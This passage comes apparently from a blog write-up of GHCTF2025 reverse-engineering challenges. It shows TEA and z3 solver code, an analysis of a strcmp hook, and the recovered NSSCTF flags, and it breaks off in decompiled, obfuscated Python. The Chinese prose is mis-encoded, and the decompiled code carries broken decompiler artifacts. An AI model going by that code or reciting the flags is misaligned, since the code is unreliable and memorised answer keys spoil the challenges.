class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0x5E2377FF</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x5E2377FF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] =</span><br><span class="line">&#123;</span><br><span class="line">        <span class="number">0x2D</span>,<span class="number">0xF7</span>,<span class="number">0x3D</span>,<span class="number">0x42</span>,<span class="number">0x01</span>,<span class="number">0x9A</span>,<span class="number">0xF5</span>,<span class="number">0x05</span>,<span class="number">0x1D</span>,<span class="number">0xCF</span>,<span class="number">0x3F</span>,<span class="number">0x63</span>,<span class="number">0x22</span>,<span class="number">0x91</span>,<span class="number">0xD1</span>,<span class="number">0x77</span></span><br><span class="line">&#125;; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> EncFlag[] = &#123; </span><br><span class="line">    <span class="number">0xDC</span>,<span class="number">0x45</span>,<span class="number">0x1E</span>,<span class="number">0x03</span>,<span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xE9</span>,<span class="number">0x76</span>,<span class="number">0x27</span>,<span class="number">0x47</span>,<span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x23</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0xD2</span>,<span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0x64</span>,<span class="number">0xDA</span>,<span class="number">0x7F</span>,<span class="number">0x46</span>,<span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0xB1</span>,<span class="number">0x03</span>,<span class="number">0x49</span>,<span class="number">0xA3</span>,<span class="number">0x27</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0xD1</span>,<span class="number">0x2C</span>,<span class="number">0x37</span>,<span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0xBD</span>,<span class="number">0x75</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span>) ^= <span class="number">0xf</span>;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span> + <span class="number">4</span>) ^= <span class="number">0xf</span>;</span><br><span class="line">        <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>,EncFlag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flagå€¼-1"><a href="#Flagå€¼-1" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;!!!Y0u_g3t_th3_s3cr3t!!!&#125;</code></p><h2 id="FishingKit"><a href="#FishingKit" class="headerlink" title="FishingKit"></a>FishingKit</h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç»“åˆé¢˜ç›®æè¿°å¯ä»¥çŸ¥é“è¿™é¢˜çš„è€ƒç‚¹æ˜¯Hookã€‚</p><p>é¦–å…ˆç¨‹åºè¦æ±‚è¾“å…¥baitæ•°æ®ï¼Œè¿›è¡Œä¸€ä¸ªè®¡ç®—æ£€éªŒï¼Œè¿™éƒ¨åˆ†ç›´æ¥ç”¨z3å°±å¯ä»¥è§£å‡ºç›®æ ‡æ•°æ®ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/9.png" alt="alt text"></p><p>z3ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a0,a1,a2,a3,a4,a5,a6,a7,a8,a9 = BitVecs(<span class="string">&quot;a0 a1 a2 a3 a4 a5 a6 a7 a8 a9&quot;</span>,<span class="number">12</span>) </span><br><span class="line"></span><br><span class="line">s.add(<span class="number">202</span> * a8 + <span class="number">216</span> * a5 - <span class="number">4</span> * a4 - <span class="number">330</span> * a9 - <span class="number">13</span> * a4 - <span class="number">268</span> * a6 == -<span class="number">14982</span>)</span><br><span class="line">s.add(<span class="number">325</span> * a8 + <span class="number">195</span> * a0 + <span class="number">229</span> * a1 - <span class="number">121</span> * a6 - <span class="number">409</span> * a6 - (a1 &lt;&lt; <span class="number">7</span>) == <span class="number">22606</span>)</span><br><span class="line">s.add(<span class="number">489</span> * a1 + <span class="number">480</span> * a6 + <span class="number">105</span> * a2 + <span class="number">367</span> * a3 - <span class="number">135</span> * a4 - <span class="number">482</span> * a9 == <span class="number">63236</span>)</span><br><span class="line">s.add(<span class="number">493</span> * a1 - <span class="number">80</span> * a4 - <span class="number">253</span> * a8 - <span class="number">121</span> * a2 - <span class="number">177</span> * a0 - <span class="number">243</span> * a9 == -<span class="number">39664</span>)</span><br><span class="line">s.add(<span class="number">275</span> * a4 + <span class="number">271</span> * a6 + <span class="number">473</span> * a7 - <span class="number">72</span> * a5 - <span class="number">260</span> * a4 - <span class="number">367</span> * a4 == <span class="number">14255</span>)</span><br><span class="line">s.add(<span class="number">286</span> * a0 + <span class="number">196</span> * a7 + <span class="number">483</span> * a2 + <span class="number">442</span> * a1 - <span class="number">495</span> * a8 - <span class="number">351</span> * a4 == <span class="number">41171</span>)</span><br><span class="line">s.add(<span class="number">212</span> * a2 + <span class="number">283</span> * a7 - <span class="number">329</span> * a8 - <span class="number">429</span> * a9 - <span class="number">362</span> * a2 - <span class="number">261</span> * a6 == -<span class="number">90284</span>)</span><br><span class="line">s.add(<span class="number">456</span> * a5 + <span class="number">244</span> * a7 + <span class="number">92</span> * a4 + <span class="number">348</span> * a7 - <span class="number">225</span> * a1 - <span class="number">31</span> * a2 == <span class="number">88447</span>)</span><br><span class="line">s.add(<span class="number">238</span> * a9 + <span class="number">278</span> * a7 + <span class="number">216</span> * a6 + <span class="number">237</span> * a0 + <span class="number">8</span> * a2 - <span class="number">17</span> * a9 == <span class="number">83838</span>)</span><br><span class="line">s.add(<span class="number">323</span> * a9 + <span class="number">121</span> * a1 + <span class="number">370</span> * a7 - (a4 &lt;&lt; <span class="number">6</span>) - <span class="number">196</span> * a9 - <span class="number">422</span> * a0 == <span class="number">26467</span>)</span><br><span class="line">s.add(<span class="number">166</span> * a9 + <span class="number">90</span> * a1 + <span class="number">499</span> * a2 + <span class="number">301</span> * a8 - <span class="number">31</span> * a2 - <span class="number">206</span> * a2 == <span class="number">88247</span>)</span><br><span class="line">s.add(<span class="number">355</span> * a0 + <span class="number">282</span> * a4 + <span class="number">44</span> * a9 + <span class="number">359</span> * a8 - <span class="number">167</span> * a5 - <span class="number">62</span> * a3 == <span class="number">76658</span>)</span><br><span class="line">s.add(<span class="number">488</span> * a6 + <span class="number">379</span> * a9 + <span class="number">318</span> * a2 - <span class="number">85</span> * a1 - <span class="number">357</span> * a2 - <span class="number">277</span> * a5 == <span class="number">35398</span>)</span><br><span class="line">s.add(<span class="number">40</span> * a0 + <span class="number">281</span> * a4 + <span class="number">217</span> * a5 - <span class="number">241</span> * a1 - <span class="number">407</span> * a7 - <span class="number">309</span> * a7 == -<span class="number">35436</span>)</span><br><span class="line">s.add(<span class="number">429</span> * a3 + <span class="number">441</span> * a3 + <span class="number">115</span> * a1 + <span class="number">96</span> * a8 + <span class="number">464</span> * a1 - <span class="number">133</span> * a7 == <span class="number">157448</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    ans = s.model() </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="string">f&quot;<span class="subst">&#123;ans[<span class="built_in">eval</span>(<span class="string">f&#x27;a<span class="subst">&#123;i&#125;</span>&#x27;</span>)]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(t),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<strong>DeluxeBait</strong>å­—ä¸²</p><p>ç„¶åä¸‹é¢éƒ¨åˆ†æœ‰ä¸ªåŠ å¯†å‡½æ•°ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯é­”æ”¹RC4ï¼ŒåŠ å¯†å®Œä¸ä¸€ä¸ªæ•°ç»„è¿›è¡Œæ¯”å¯¹ï¼Œè¿™è¾¹è§£å¯†åä¼šå¾—åˆ°å‡Flagï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±è§£å¯†è¯•è¯•ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/10.png" alt="alt text"></p><p>ç”±äºçŸ¥é“æ˜¯Hookè€ƒç‚¹ï¼Œç›´æ¥å­—ç¬¦ä¸²æœç´¢VirtualProtectï¼Œå®šä½ï¼ŒæŸ¥æ‰¾äº¤å‰å¼•ç”¨ï¼Œå‘ç°æœ‰ä¸€ä¸ªå‡½æ•°æœ‰è°ƒç”¨ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/11.png" alt="alt text"></p><p>å¯ä»¥çœ‹å‡ºè¿™éƒ¨åˆ†å°±æ˜¯Hookä»£ç ï¼Œä¸Šé¢çš„0xff,0x25å°±æ˜¯far jmpçš„æ±‡ç¼–ï¼Œå‚æ•°ä¸€ä¼ è¿›æ¥è¦Hookçš„å‡½æ•°ï¼Œå‚æ•°äºŒæ˜¯è‡ªå·±çš„å‡½æ•°ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/12.png" alt="alt text"></p><p>åœ¨ä»–çš„è°ƒç”¨ä¸Šå±‚å°±å¯ä»¥çœ‹åˆ°è·å–äº†æ¨¡å—å’Œå‡½æ•°åœ°å€ï¼Œä¸è¿‡åšäº†å¼‚æˆ–åŠ å¯†å¤„ç†ï¼Œsub_140001CE0å°±æ˜¯Hookå‡½æ•°è¦è·³è½¬æ‰§è¡Œçš„å‡½æ•°ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/13.png" alt="alt text"></p><p>å¯ä»¥è§£å¯†å‡ºæ¥æ˜¯strcmpï¼Œä¹Ÿå°±æ˜¯å¯¹strcmpåšäº†Hookï¼Œä¹‹å‰åœ¨ä¸»å‡½æ•°æœ‰çœ‹åˆ°strcmpï¼Œå°±æ˜¯é‚£é‡Œç¨‹åºå‘ç”Ÿäº†è·³è½¬ï¼Œæ²¡æœ‰æ‰§è¡ŒçœŸå®çš„strcmpã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/14.png" alt="alt text"></p><p>æ‰€ä»¥æ¥ä¸‹æ¥é‡ç‚¹åˆ†æsub_140001CE0å‡½æ•°ã€‚å¯ä»¥çœ‹åˆ°è¿™è¾¹æ˜¯å¯¹æ•°æ®è¿›è¡Œäº†24è½®TeaåŠ å¯†ï¼Œæœ€åä¸byte_1400063C8æ•°ç»„è¿›è¡Œæ¯”å¯¹ï¼Œé‚£ä¹ˆbyte_1400063C8å°±æ˜¯çœŸå®è¢«åŠ å¯†çš„Flagã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/15.png" alt="alt text"></p><p>è¿™è¾¹é‡ç‚¹å°±æ˜¯ä¼ å…¥çš„bufå’Œbuf_1æ•°æ®å®é™…æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥åœ¨èµ‹è¿™ä¸¤ä¸ªæ•°ç»„èµ‹å€¼å®Œåå¤„è¿›è¡Œæ–­ç‚¹ï¼ŒæŸ¥çœ‹å®é™…æ•°æ®ã€‚</p><p>å¯ä»¥å‘ç°å®é™…ä¸Šå°±æ˜¯DeluxeBaitå­—ä¸²ä»¥åŠè¾“å…¥çš„Flagå€¼ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/16.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/17.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/18.png" alt="alt text"></p><p>ç”±äºbufæ•°ç»„åœ¨å¼€å¤´å·²ç»memset 0äº†ï¼Œèµ‹å€¼çš„å­—ä¸²â€DeluxeBaitâ€é•¿åº¦ä»…æœ‰10ï¼Œè€ŒTeaåŠ å¯†è¦çš„Keyå¿…é¡»æ˜¯16å­—èŠ‚ï¼Œæ‰€ä»¥æœ€ç»ˆè¿›è¡ŒåŠ å¯†çš„Keyæ˜¯è¿™ä¸ªå­—ä¸²åŠ ä¸Š6ä¸ª0x00ã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x66778899</span>, sum = delta * <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> EncFlag[<span class="number">24</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(EncFlag, <span class="string">&quot;!V&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    EncFlag[<span class="number">2</span>] = <span class="number">-105</span>;</span><br><span class="line">    EncFlag[<span class="number">3</span>] = <span class="number">-90</span>;</span><br><span class="line">    EncFlag[<span class="number">4</span>] = <span class="number">26</span>;</span><br><span class="line">    EncFlag[<span class="number">5</span>] = <span class="number">-43</span>;</span><br><span class="line">    EncFlag[<span class="number">6</span>] = <span class="number">-60</span>;</span><br><span class="line">    EncFlag[<span class="number">7</span>] = <span class="number">-34</span>;</span><br><span class="line">    EncFlag[<span class="number">8</span>] = <span class="number">-92</span>;</span><br><span class="line">    EncFlag[<span class="number">9</span>] = <span class="number">-100</span>;</span><br><span class="line">    EncFlag[<span class="number">10</span>] = <span class="number">-126</span>;</span><br><span class="line">    EncFlag[<span class="number">11</span>] = <span class="number">77</span>;</span><br><span class="line">    EncFlag[<span class="number">12</span>] = <span class="number">-47</span>;</span><br><span class="line">    EncFlag[<span class="number">13</span>] = <span class="number">69</span>;</span><br><span class="line">    EncFlag[<span class="number">14</span>] = <span class="number">-56</span>;</span><br><span class="line">    EncFlag[<span class="number">15</span>] = <span class="number">86</span>;</span><br><span class="line">    EncFlag[<span class="number">16</span>] = <span class="number">-89</span>;</span><br><span class="line">    EncFlag[<span class="number">17</span>] = <span class="number">-76</span>;</span><br><span class="line">    EncFlag[<span class="number">18</span>] = <span class="number">-106</span>;</span><br><span class="line">    EncFlag[<span class="number">19</span>] = <span class="number">92</span>;</span><br><span class="line">    EncFlag[<span class="number">20</span>] = <span class="number">77</span>;</span><br><span class="line">    EncFlag[<span class="number">21</span>] = <span class="number">73</span>;</span><br><span class="line">    EncFlag[<span class="number">22</span>] = <span class="number">-121</span>;</span><br><span class="line">    EncFlag[<span class="number">23</span>] = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Key[] = <span class="string">&quot;DeluxeBait\0\0\0\0\0\0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag + <span class="number">8</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag + <span class="number">16</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.23s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flagå€¼-2"><a href="#Flagå€¼-2" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;Wh@t_@_b1g_F1sh&#125;</code></p><h2 id="Mioï¼ŸRyoï¼ŸSoyoï¼Ÿ"><a href="#Mioï¼ŸRyoï¼ŸSoyoï¼Ÿ" class="headerlink" title="Mioï¼ŸRyoï¼ŸSoyoï¼Ÿ"></a>Mioï¼ŸRyoï¼ŸSoyoï¼Ÿ</h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¬¬äºŒæ‰¹é¢˜ç›®çš„ç­¾åˆ°é¢˜ï¼Œå¸¸è§„çš„Pythonç¨‹åºè§£åŒ…ã€‚</p><p>ä½¿ç”¨pyinstxtractorè¿›è¡Œè§£åŒ…ï¼Œéœ€è¦å¯¹åº”ç¨‹åºpythonç‰ˆæœ¬ï¼Œä½¿ç”¨python3.8è¿è¡Œï¼Œå¦åˆ™æ— æ³•è§£å‹pyzæ–‡ä»¶å¾—åˆ°Secret.pycã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/19.png" alt="alt text"></p><p>ä½¿ç”¨uncompyle6è¿›è¡Œpycåç¼–è¯‘program.pycå¯ä»¥çœ‹åˆ°æºç ã€‚å‘ç°å¼•å…¥äº†Secretæ–‡ä»¶ï¼Œå¯ä»¥åœ¨PYZ-00.pyz_extractedæ‰¾åˆ°å¯¹åº”pycæ–‡ä»¶ï¼ŒåŒæ ·ä½¿ç”¨uncompyle6å¾—åˆ°æºç ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/20.png" alt="alt text"></p><p>å‘ç°å¼•å…¥äº†SecretEncryptæ–‡ä»¶ï¼Œå¹¶ä¸”è¿™è¾¹æœ‰program.pyé‡Œçœ‹åˆ°è¢«è°ƒç”¨æ¯”å¯¹çš„æ•°æ®ï¼Œå¤§æ¦‚ç‡å°±æ˜¯è¢«åŠ å¯†çš„Flagã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/21.png" alt="alt text"></p><p>åç¼–è¯‘å¾—åˆ°SecretEncryptä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MMMMiiiiiio</span>:</span><br><span class="line">    MMiiiiiiooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(Miiooooooooo) <span class="keyword">for</span> Miiooooooooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">118</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">MMMMiiooooooo</span>(<span class="params">MMMMMMMMMiiiooo: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        MMMMiiiiioooooooooo = <span class="string">&quot;&quot;</span></span><br><span class="line">        MMMMMMMiiiiioo = (<span class="number">4</span> - <span class="built_in">len</span>(MMMMMMMMMiiiooo) % <span class="number">4</span>) % <span class="number">4</span></span><br><span class="line">        MMMMMMMMMiiiooo += <span class="string">b&#x27;\x00&#x27;</span> * MMMMMMMiiiiioo</span><br><span class="line">        <span class="keyword">for</span> MMMMMMiiiiiio <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(MMMMMMMMMiiiooo), <span class="number">4</span>):</span><br><span class="line">            MMMMiiiiiiooooo = MMMMMMMMMiiiooo[MMMMMMiiiiiio[:MMMMMMiiiiiio + <span class="number">4</span>]]</span><br><span class="line">            MMMMMMiiioooooo = <span class="built_in">int</span>.from_bytes(MMMMiiiiiiooooo, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">            MMMMMMMiiooooooooo = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                MMMMMMMiiooooooooo = MMMMiiiiiio.MMiiiiiiooo[MMMMMMiiioooooo % <span class="number">85</span>] + MMMMMMMiiooooooooo</span><br><span class="line">                MMMMMMiiioooooo //= <span class="number">85</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                MMMMiiiiioooooooooo += MMMMMMMiiooooooooo</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> MMMMMMMiiiiioo:</span><br><span class="line">                MMMMiiiiioooooooooo = MMMMiiiiioooooooooo[<span class="literal">None</span>[:-MMMMMMMiiiiioo]]</span><br><span class="line">            <span class="keyword">return</span> MMMMiiiiioooooooooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RRRRyyooo</span>:</span><br><span class="line">    RRRRyooooooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(RRRRRRRyyyyyoooo) <span class="keyword">for</span> RRRRRRRyyyyyoooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RRRRRRRyyyyooooo</span>(<span class="params">RRRRRRyyyoooooo: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        RRRRyyyyyooo = []</span><br><span class="line">        RRyyyyyyyyyoooooo = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> RRyyyyyyyyyoooooo &lt; <span class="built_in">len</span>(RRRRRRyyyoooooo):</span><br><span class="line">            <span class="keyword">if</span> RRyyyyyyyyyoooooo + <span class="number">1</span> &lt; <span class="built_in">len</span>(RRRRRRyyyoooooo):</span><br><span class="line">                RRRRRRRRRyyo = RRRRRRyyyoooooo[RRyyyyyyyyyoooooo] &lt;&lt; <span class="number">8</span> | RRRRRRyyyoooooo[RRyyyyyyyyyoooooo + <span class="number">1</span>]</span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo])</span><br><span class="line">                RRyyyyyyyyyoooooo += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RRRRRRRRRyyo = RRRRRRyyyoooooo[RRyyyyyyyyyoooooo]</span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo])</span><br><span class="line">                